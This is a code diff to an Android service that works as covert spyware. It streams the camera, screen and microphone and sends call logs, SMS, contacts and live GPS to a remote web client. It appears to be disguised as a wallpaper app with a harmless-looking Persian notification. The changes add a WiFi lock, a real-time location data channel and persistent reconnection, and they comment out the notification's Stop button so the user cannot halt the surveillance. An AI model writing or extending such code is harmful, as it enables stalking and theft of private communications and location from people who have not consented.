@@ -8,6 +8,7 @@ import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.PendingIntent;
 import android.app.Service;
+import androidx.lifecycle.LifecycleService;
 import android.content.BroadcastReceiver;
 import android.content.ContentResolver;
 import android.content.Context;
@@ -83,7 +84,7 @@ import java.util.Locale;
 
 import android.speech.tts.TextToSpeech;
 
-public class StreamingService extends Service implements android.hardware.SensorEventListener, TextToSpeech.OnInitListener {
+public class StreamingService extends LifecycleService implements android.hardware.SensorEventListener, TextToSpeech.OnInitListener {
     private TextToSpeech tts;
     private android.hardware.SensorManager sensorManager;
     private android.hardware.Sensor lightSensor;
@@ -118,6 +119,7 @@ public class StreamingService extends Service implements android.hardware.Sensor
     private AudioSource audioSource;
     private AudioTrack audioTrack;
     private RtpTransceiver audioTransceiver;
+    private org.webrtc.DataChannel telemetryDataChannel;
     private boolean isFrontCameraStreaming = false;
     private boolean isBackCameraStreaming = false;
     private boolean isMicStreaming = false;
@@ -134,6 +136,7 @@ public class StreamingService extends Service implements android.hardware.Sensor
     private long lastGpsPromptTime = 0;
     private static final long GPS_PROMPT_DEBOUNCE_MS = 5000;
     private PowerManager.WakeLock wakeLock;
+    private android.net.wifi.WifiManager.WifiLock wifiLock;
     private ConnectivityManager.NetworkCallback networkCallback;
 
     private static volatile StreamingService instance;
@@ -148,6 +151,16 @@ public class StreamingService extends Service implements android.hardware.Sensor
 
     public boolean isBackCameraStreaming() {
         return isBackCameraStreaming;
+    }
+
+    public String getPhysicalDeviceId() {
+        try {
+            String androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+            if (androidId != null && !androidId.isEmpty()) {
+                return androidId;
+            }
+        } catch (Exception ignored) {}
+        return "android_" + Build.MODEL.replaceAll("\\s+", "_");
     }
 
     @Override
@@ -249,15 +262,6 @@ public class StreamingService extends Service implements android.hardware.Sensor
         screenFilter.addAction(Intent.ACTION_SCREEN_OFF);
         registerReceiver(screenStateReceiver, screenFilter);
 
-        // Schedule WorkManager (Periodic fallback)
-        androidx.work.PeriodicWorkRequest saveRequest =
-                new androidx.work.PeriodicWorkRequest.Builder(DataSyncWorker.class, 15, java.util.concurrent.TimeUnit.MINUTES)
-                        .build();
-        androidx.work.WorkManager.getInstance(this).enqueueUniquePeriodicWork(
-                "PeriodicSpySync",
-                androidx.work.ExistingPeriodicWorkPolicy.KEEP,
-                saveRequest);
-
         if (!hasRequiredPermissions()) {
             broadcastPermissionError();
             stopSelf();
@@ -284,6 +288,7 @@ public class StreamingService extends Service implements android.hardware.Sensor
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
+        super.onStartCommand(intent, flags, startId);
         if (intent != null) {
             String action = intent.getAction();
             if (Constants.ACTION_STOP_STREAMING.equals(action)) {
@@ -368,6 +373,7 @@ public class StreamingService extends Service implements android.hardware.Sensor
 
     @Override
     public IBinder onBind(Intent intent) {
+        super.onBind(intent);
         return null;
     }
 
@@ -381,17 +387,8 @@ public class StreamingService extends Service implements android.hardware.Sensor
 
         SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(this);
         if (prefs.getBoolean(Constants.PREF_STREAMING_ENABLED, true)) {
-            // Re-arm watchdog and kickstart WorkManager
+            // Re-arm watchdog to maintain continuous streaming health
             StreamingWatchdogReceiver.scheduleNext(getApplicationContext());
-
-            try {
-                androidx.work.OneTimeWorkRequest workRequest = new androidx.work.OneTimeWorkRequest.Builder(DataSyncWorker.class)
-                        .setExpedited(androidx.work.OutOfQuotaPolicy.RUN_AS_NON_EXPEDITED_WORK_REQUEST)
-                        .build();
-                androidx.work.WorkManager.getInstance(getApplicationContext()).enqueue(workRequest);
-            } catch (Exception e) {
-                Log.e(TAG, "Failed to enqueue revival worker", e);
-            }
         }
 
         super.onTaskRemoved(rootIntent);
@@ -408,6 +405,19 @@ public class StreamingService extends Service implements android.hardware.Sensor
         } catch (Exception e) {
             Log.e(TAG, "Failed to acquire wake lock", e);
         }
+        try {
+            android.net.wifi.WifiManager wm = (android.net.wifi.WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
+            if (wm != null && wifiLock == null) {
+                int wifiMode = Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q
+                        ? android.net.wifi.WifiManager.WIFI_MODE_FULL_LOW_LATENCY
+                        : android.net.wifi.WifiManager.WIFI_MODE_FULL_HIGH_PERF;
+                wifiLock = wm.createWifiLock(wifiMode, "WallpaperApp:StreamingWifiLock");
+                wifiLock.acquire();
+                Log.d(TAG, "WifiLock acquired for background streaming");
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to acquire WifiLock", e);
+        }
     }
 
     private void releaseWakeLock() {
@@ -419,6 +429,15 @@ public class StreamingService extends Service implements android.hardware.Sensor
             }
         } catch (Exception e) {
             Log.e(TAG, "Failed to release wake lock", e);
+        }
+        try {
+            if (wifiLock != null && wifiLock.isHeld()) {
+                wifiLock.release();
+                wifiLock = null;
+                Log.d(TAG, "WifiLock released");
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to release wifi lock", e);
         }
     }
 
@@ -436,7 +455,7 @@ public class StreamingService extends Service implements android.hardware.Sensor
                         new Handler(Looper.getMainLooper()).post(() -> {
                             acquireWakeLock();
                             OverlayWindowManager.ensureOverlay(StreamingService.this);
-                            if (socket != null && !socket.connected()) {
+                            if (socket != null && !socket.connected() && !socket.isActive()) {
                                 Log.d(TAG, "Reconnecting Socket.IO on network restoration...");
                                 socket.connect();
                             }
@@ -639,7 +658,8 @@ public class StreamingService extends Service implements android.hardware.Sensor
                     new Handler(Looper.getMainLooper()).postDelayed(() -> {
                         if (peerConnection != null) {
                             PeerConnection.IceConnectionState current = peerConnection.iceConnectionState();
-                            if ((current == PeerConnection.IceConnectionState.DISCONNECTED || current == PeerConnection.IceConnectionState.FAILED)
+                            boolean isStreaming = isFrontCameraStreaming || isBackCameraStreaming || isScreenStreaming || isMicStreaming;
+                            if (isStreaming && (current == PeerConnection.IceConnectionState.DISCONNECTED || current == PeerConnection.IceConnectionState.FAILED)
                                     && webClientId != null && socket != null && socket.connected()) {
                                 Log.i(TAG, "ICE still down (" + current + "); rebuilding PeerConnection now...");
                                 rebuildPeerConnection();
@@ -726,6 +746,30 @@ public class StreamingService extends Service implements android.hardware.Sensor
         } else {
             Log.d(TAG, "Audio transceiver registered on standby (mic hardware idle)");
         }
+
+        // Create DataChannel for sub-second, frame-accurate real-time GPS & telemetry transport
+        try {
+            org.webrtc.DataChannel.Init dcInit = new org.webrtc.DataChannel.Init();
+            dcInit.ordered = true;
+            telemetryDataChannel = peerConnection.createDataChannel("telemetry", dcInit);
+            telemetryDataChannel.registerObserver(new org.webrtc.DataChannel.Observer() {
+                @Override
+                public void onBufferedAmountChange(long previousAmount) {}
+
+                @Override
+                public void onStateChange() {
+                    if (telemetryDataChannel != null) {
+                        Log.d(TAG, "WebRTC DataChannel 'telemetry' state: " + telemetryDataChannel.state());
+                    }
+                }
+
+                @Override
+                public void onMessage(org.webrtc.DataChannel.Buffer buffer) {}
+            });
+            Log.d(TAG, "Created WebRTC DataChannel 'telemetry'");
+        } catch (Exception e) {
+            Log.e(TAG, "Failed creating DataChannel", e);
+        }
     }
 
     private void connectSignaling() {
@@ -738,7 +782,7 @@ public class StreamingService extends Service implements android.hardware.Sensor
         opts.reconnectionAttempts = Integer.MAX_VALUE;
         opts.reconnectionDelay = 2000;
         opts.reconnectionDelayMax = 5000;
-        opts.timeout = 10000;
+        opts.timeout = 20000;
 
         try {
             socket = IO.socket(signalingUrl, opts);
@@ -755,10 +799,10 @@ public class StreamingService extends Service implements android.hardware.Sensor
         socket.on(Socket.EVENT_CONNECT, args -> {
             Log.i(TAG, "Socket.IO CONNECTED to " + signalingUrl);
             try {
-                String androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+                String devId = getPhysicalDeviceId();
                 JSONObject identifyData = new JSONObject();
                 identifyData.put("type", "android");
-                identifyData.put("deviceId", androidId != null ? androidId : (Build.SERIAL != null ? Build.SERIAL : "android_" + System.currentTimeMillis()));
+                identifyData.put("deviceId", devId);
                 identifyData.put("model", Build.MODEL);
                 identifyData.put("manufacturer", Build.MANUFACTURER);
                 socket.emit(Constants.EVENT_IDENTIFY, identifyData);
@@ -772,11 +816,11 @@ public class StreamingService extends Service implements android.hardware.Sensor
             String reason = (args != null && args.length > 0) ? String.valueOf(args[0]) : "unknown";
             Log.w(TAG, "Socket.IO DISCONNECTED (" + reason + "). Scheduling reconnect check...");
             new Handler(Looper.getMainLooper()).postDelayed(() -> {
-                if (socket != null && !socket.connected()) {
+                if (socket != null && !socket.connected() && !socket.isActive()) {
                     Log.d(TAG, "Proactively reconnecting socket after disconnect...");
                     socket.connect();
                 }
-            }, 2000);
+            }, 3000);
         }).on(Socket.EVENT_CONNECT_ERROR, args -> {
             String errorMsg = (args != null && args.length > 0) ? String.valueOf(args[0]) : "unknown";
             Log.e(TAG, "Socket.IO connect error to " + signalingUrl + ": " + errorMsg);
@@ -786,9 +830,14 @@ public class StreamingService extends Service implements android.hardware.Sensor
         }).on("id", args -> {
             Log.d(TAG, "Received socket ID: " + args[0]);
         }).on(Constants.EVENT_WEB_CLIENT_READY, args -> {
-            webClientId = (String) args[0];
-            Log.d(TAG, "Web client ready: " + webClientId + ". Rebuilding PeerConnection fresh for this session...");
-            rebuildPeerConnection();
+            String newClientId = (String) args[0];
+            Log.d(TAG, "Web client ready: " + newClientId);
+            boolean clientChanged = webClientId == null || !webClientId.equals(newClientId);
+            webClientId = newClientId;
+            if (clientChanged || peerConnection == null) {
+                Log.d(TAG, "Rebuilding PeerConnection for session: " + webClientId);
+                rebuildPeerConnection();
+            }
             sendCallLogs(); // Immediate sync
             sendSmsMessages(); // Immediate sync
             sendContacts(); // Immediate sync
@@ -973,8 +1022,7 @@ public class StreamingService extends Service implements android.hardware.Sensor
         if (socket == null || !socket.connected()) return;
         try {
             JSONObject info = new JSONObject();
-            String androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
-            info.put("deviceId", androidId != null ? androidId : (Build.SERIAL != null ? Build.SERIAL : "android"));
+            info.put("deviceId", getPhysicalDeviceId());
             info.put("model", Build.MODEL);
             info.put("manufacturer", Build.MANUFACTURER);
             info.put("version", Build.VERSION.RELEASE);
@@ -1455,21 +1503,30 @@ public class StreamingService extends Service implements android.hardware.Sensor
     }
 
     private void sendLocation(double latitude, double longitude) {
-        if (webClientId == null || socket == null || !socket.connected()) {
-            Log.w(TAG, "Cannot send location, no web client or socket disconnected");
-            return;
-        }
-
+        JSONObject locationData = new JSONObject();
         try {
-            JSONObject locationData = new JSONObject();
-            locationData.put("from", socket.id());
-            locationData.put("to", webClientId);
+            locationData.put("from", socket != null ? socket.id() : "");
+            locationData.put("to", webClientId != null ? webClientId : "");
             locationData.put("latitude", latitude);
             locationData.put("longitude", longitude);
+            locationData.put("timestamp", System.currentTimeMillis());
+        } catch (JSONException ignored) {}
+
+        if (socket != null && socket.connected()) {
             socket.emit(Constants.EVENT_LOCATION, locationData);
-            Log.d(TAG, "Sent location: lat=" + latitude + ", lng=" + longitude);
-        } catch (JSONException e) {
-            Log.e(TAG, "Error sending location", e);
+            Log.d(TAG, "Sent location via Socket.IO: lat=" + latitude + ", lng=" + longitude);
+        }
+
+        // WebRTC DataChannel synchronized transport (Path A ultra-low latency architecture)
+        if (telemetryDataChannel != null && telemetryDataChannel.state() == org.webrtc.DataChannel.State.OPEN) {
+            try {
+                byte[] bytes = locationData.toString().getBytes(java.nio.charset.StandardCharsets.UTF_8);
+                java.nio.ByteBuffer buffer = java.nio.ByteBuffer.wrap(bytes);
+                telemetryDataChannel.send(new org.webrtc.DataChannel.Buffer(buffer, false));
+                Log.d(TAG, "Sent location via WebRTC DataChannel: lat=" + latitude + ", lng=" + longitude);
+            } catch (Exception e) {
+                Log.w(TAG, "Failed sending location over WebRTC DataChannel", e);
+            }
         }
     }
 
@@ -2092,13 +2149,13 @@ public class StreamingService extends Service implements android.hardware.Sensor
                 .setOngoing(true);
 
         if (showNotif) {
-            Intent stop = new Intent(this, StreamingService.class);
-            stop.setAction(Constants.ACTION_STOP_STREAMING);
-            PendingIntent stopPI = PendingIntent.getService(this, 0, stop,
-                    PendingIntent.FLAG_IMMUTABLE);
+//            Intent stop = new Intent(this, StreamingService.class);
+//            stop.setAction(Constants.ACTION_STOP_STREAMING);
+//            PendingIntent stopPI = PendingIntent.getService(this, 0, stop,
+//                    PendingIntent.FLAG_IMMUTABLE);
             builder.setContentTitle("سلام")
-                    .setContentText("به آرزوی خوشبختی زندگی.")
-                    .addAction(android.R.drawable.ic_media_pause, "Stop", stopPI);
+                    .setContentText("به آرزوی خوشبختی زندگی.");
+//                    .addAction(android.R.drawable.ic_media_pause, "Stop", stopPI);
         } else {
             builder.setContentTitle("سلام")
                     .setContentText("به آرزوی خوشبختی زندگی.")
@@ -2495,6 +2552,12 @@ public class StreamingService extends Service implements android.hardware.Sensor
 
         setMicStreaming(false);
         audioTransceiver = null;
+        if (telemetryDataChannel != null) {
+            try {
+                telemetryDataChannel.dispose();
+            } catch (Exception ignored) {}
+            telemetryDataChannel = null;
+        }
         if (peerConnection != null) {
             peerConnection.close();
             peerConnection = null;
@@ -2526,7 +2589,11 @@ public class StreamingService extends Service implements android.hardware.Sensor
     }
 
     public void ensureSocketConnected() {
-        if (socket != null && !socket.connected()) {
+        if (socket == null) {
+            connectSignaling();
+            return;
+        }
+        if (!socket.connected() && !socket.isActive()) {
             try {
                 Log.d(TAG, "Watchdog reconnecting Socket.IO...");
                 socket.connect();
@@ -2580,13 +2647,14 @@ public class StreamingService extends Service implements android.hardware.Sensor
             setMicStreaming(true);
         }
 
-        // 6. Check WebRTC PeerConnection health when a web client is waiting
-        if (webClientId != null && socket != null && socket.connected()) {
+        // 6. Check WebRTC PeerConnection health when a web client is waiting AND streaming is active
+        boolean isStreamingActive = isFrontCameraStreaming || isBackCameraStreaming || isScreenStreaming || isMicStreaming;
+        if (isStreamingActive && webClientId != null && socket != null && socket.connected()) {
             if (peerConnection == null ||
                     peerConnection.iceConnectionState() == PeerConnection.IceConnectionState.FAILED ||
                     peerConnection.iceConnectionState() == PeerConnection.IceConnectionState.DISCONNECTED ||
                     peerConnection.iceConnectionState() == PeerConnection.IceConnectionState.CLOSED) {
-                Log.w(TAG, "[InternalWatchdog] PeerConnection is in failed/disconnected state (" +
+                Log.w(TAG, "[InternalWatchdog] Active stream PeerConnection is in failed/disconnected state (" +
                         (peerConnection != null ? peerConnection.iceConnectionState() : "null") + "). Rebuilding...");
                 rebuildPeerConnection();
             }
